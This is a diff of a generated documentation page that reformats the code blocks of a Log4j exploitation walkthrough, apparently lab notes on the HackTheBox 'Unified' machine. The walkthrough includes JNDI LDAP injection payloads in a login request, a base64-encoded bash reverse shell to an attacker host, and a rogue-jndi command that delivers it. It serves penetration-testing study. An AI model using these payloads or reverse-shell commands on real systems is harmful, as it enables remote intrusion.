@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17071,10 +17094,12 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection). Log4j is a popular logging library for Java created in 2001. The logging library's main purpose is to provide developers with a way to change the format and verbosity of logging through configuration files versus code. </p>
 <h2 id="what-it-does">What it does</h2>
 <p>What a logging library does, is instead of using print statements, the developer just uses a wrapper around the Logging class or object. So instead of using print(line), the code would look like this:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>logging.INFO(“Application Started”)
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>logging.WARN(“File Uploaded”)
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>logging.DEBUG(“SQL Query Ran”)
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span>
+<span class="normal"><a href="#__codelineno-0-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>logging.INFO(“Application Started”)
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>logging.WARN(“File Uploaded”)
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>logging.DEBUG(“SQL Query Ran”)
+</span></code></pre></div></td></tr></table></div>
 <p>Then the application has a configuration file which says what log levels (INFO, WARN, DEBUG, etc.) to display. This way when there is a problem with the application, the developer can enable DEBUG mode and instantly get the messages they need to identify the issue.</p>
 <h2 id="reconnaissance-proof-of-concept">Reconnaissance - Proof of Concept</h2>
 <p>The main way people have been testing if an application is vulnerable is by combining this vulnerability with JNDI.</p>
@@ -17084,73 +17109,125 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><strong>Proof of concepts to see if it is vulnerable</strong>:</p>
 <p><strong>1.</strong> Grab the request with the injectable parameter.</p>
 <p><strong>2.</strong> In the injectable parameter, inject something like this:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>&quot;${jndi:ldap://AtackerIP/whatever}&quot;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>&quot;${jndi:ldap://AtackerIP/whatever}&quot;
+</span></code></pre></div></td></tr></table></div>
 <p>With <a href="../tcpdump/">tcpdump</a>, check if the request with the payload produces some traffic to your attacker machine:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>tun0<span class="w"> </span>port<span class="w"> </span><span class="m">389</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1"># -i: Select interface</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># port: indicate the port where traffic is going to be captured. </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>tun0<span class="w"> </span>port<span class="w"> </span><span class="m">389</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="c1"># -i: Select interface</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="c1"># port: indicate the port where traffic is going to be captured. </span>
+</span></code></pre></div></td></tr></table></div>
 <p>The tcpdump output shows a connection being received on our machine. This proves that the application is indeed vulnerable since it is trying to connect back to us on the LDAP port 389.</p>
 <h2 id="exploitation">Exploitation</h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a># Install Open-JDK and Maven as requirement
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo apt install openjdk-11-jre maven
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>git clone https://github.com/veracode-research/rogue-jndi 
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>cd rogue-jndi
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>mvn package
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a># Once it&#39;s build, make a reverse shell in base64 with attacker machine and listening port
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>echo &#39;bash -c bash -i &gt;&amp;/dev/tcp/$AttackerIP/$AttackerPort 0&gt;&amp;1&#39; | base64
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a># This will return something similar to this: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>
-</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a># Get out of rogue-jndi folder and
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>java -jar rogue-jndi/target/RogueJndi-1.1.jar --command &quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}&quot; --hostname &quot;10.129.96.149&quot;
-</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a># In the bash command, copy paste your reverse shell in base64
-</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a># --hostname: Victim IP
-</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
-</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a># Now, open a terminal, launch [[netcat]] and the listening port you defined in your payload.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span>
+<span class="normal"><a href="#__codelineno-3-17">17</a></span>
+<span class="normal"><a href="#__codelineno-3-18">18</a></span>
+<span class="normal"><a href="#__codelineno-3-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a># Install Open-JDK and Maven as requirement
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>sudo apt install openjdk-11-jre maven
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>git clone https://github.com/veracode-research/rogue-jndi 
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a>cd rogue-jndi
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a>mvn package
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a># Once it&#39;s build, make a reverse shell in base64 with attacker machine and listening port
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a>echo &#39;bash -c bash -i &gt;&amp;/dev/tcp/$AttackerIP/$AttackerPort 0&gt;&amp;1&#39; | base64
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a># This will return something similar to this: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13"></a>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14"></a># Get out of rogue-jndi folder and
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a>java -jar rogue-jndi/target/RogueJndi-1.1.jar --command &quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}&quot; --hostname &quot;10.129.96.149&quot;
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16"></a># In the bash command, copy paste your reverse shell in base64
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17"></a># --hostname: Victim IP
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18"></a>
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19"></a># Now, open a terminal, launch [[netcat]] and the listening port you defined in your payload.
+</span></code></pre></div></td></tr></table></div>
 <p>With Burpsuite, get a request for login:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>POST /api/login HTTP/1.1
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Host: 10.129.96.149:8443
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Accept: */*
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>Referer: https://10.129.96.149:8443/manage/account/login
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>Content-Type: application/json; charset=utf-8
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>Origin: https://10.129.96.149:8443
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>Content-Length: 104
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>Sec-Fetch-Dest: empty
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>Sec-Fetch-Mode: cors
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>Sec-Fetch-Site: same-origin
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>Te: trailers
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>Connection: close
-</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:false,&quot;strict&quot;:true}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span>
+<span class="normal"><a href="#__codelineno-4-13">13</a></span>
+<span class="normal"><a href="#__codelineno-4-14">14</a></span>
+<span class="normal"><a href="#__codelineno-4-15">15</a></span>
+<span class="normal"><a href="#__codelineno-4-16">16</a></span>
+<span class="normal"><a href="#__codelineno-4-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>POST /api/login HTTP/1.1
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>Host: 10.129.96.149:8443
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>Accept: */*
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>Referer: https://10.129.96.149:8443/manage/account/login
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>Content-Type: application/json; charset=utf-8
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>Origin: https://10.129.96.149:8443
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>Content-Length: 104
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>Sec-Fetch-Dest: empty
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>Sec-Fetch-Mode: cors
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a>Sec-Fetch-Site: same-origin
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>Te: trailers
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a>Connection: close
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:false,&quot;strict&quot;:true}
+</span></code></pre></div></td></tr></table></div>
 <p>This request is from <a href="../htb-unified/">HackTheBox machine: Unified</a>. As we can read from the Unifi version exploit, the injectable parameter is "remember". So we insert there our payload and with Repeater, send the request:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>POST /api/login HTTP/1.1
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Host: 10.129.96.149:8443
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>Accept: */*
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>Referer: https://10.129.96.149:8443/manage/account/login
-</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>Content-Type: application/json; charset=utf-8
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>Origin: https://10.129.96.149:8443
-</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>Content-Length: 104
-</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>Sec-Fetch-Dest: empty
-</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>Sec-Fetch-Mode: cors
-</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>Sec-Fetch-Site: same-origin
-</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>Te: trailers
-</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>Connection: close
-</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>
-</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:&quot;${jndi:ldap://10.10.14.2:1389/o=tomcat}&quot;,&quot;strict&quot;:true}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-5-10">10</a></span>
+<span class="normal"><a href="#__codelineno-5-11">11</a></span>
+<span class="normal"><a href="#__codelineno-5-12">12</a></span>
+<span class="normal"><a href="#__codelineno-5-13">13</a></span>
+<span class="normal"><a href="#__codelineno-5-14">14</a></span>
+<span class="normal"><a href="#__codelineno-5-15">15</a></span>
+<span class="normal"><a href="#__codelineno-5-16">16</a></span>
+<span class="normal"><a href="#__codelineno-5-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>POST /api/login HTTP/1.1
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>Host: 10.129.96.149:8443
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>Accept: */*
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a>Referer: https://10.129.96.149:8443/manage/account/login
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8"></a>Content-Type: application/json; charset=utf-8
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a>Origin: https://10.129.96.149:8443
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10"></a>Content-Length: 104
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11"></a>Sec-Fetch-Dest: empty
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12"></a>Sec-Fetch-Mode: cors
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13"></a>Sec-Fetch-Site: same-origin
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14"></a>Te: trailers
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15"></a>Connection: close
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16"></a>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:&quot;${jndi:ldap://10.10.14.2:1389/o=tomcat}&quot;,&quot;strict&quot;:true}
+</span></code></pre></div></td></tr></table></div>
 <p>Once we send that request, our jndi server will resend the reverse shell:</p>
 <p><img alt="jndi server" src="../img/log4j.png" /></p>
 <p>And in our terminal with the nc listener we will get the reverse shell.</p>
@@ -17236,7 +17313,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
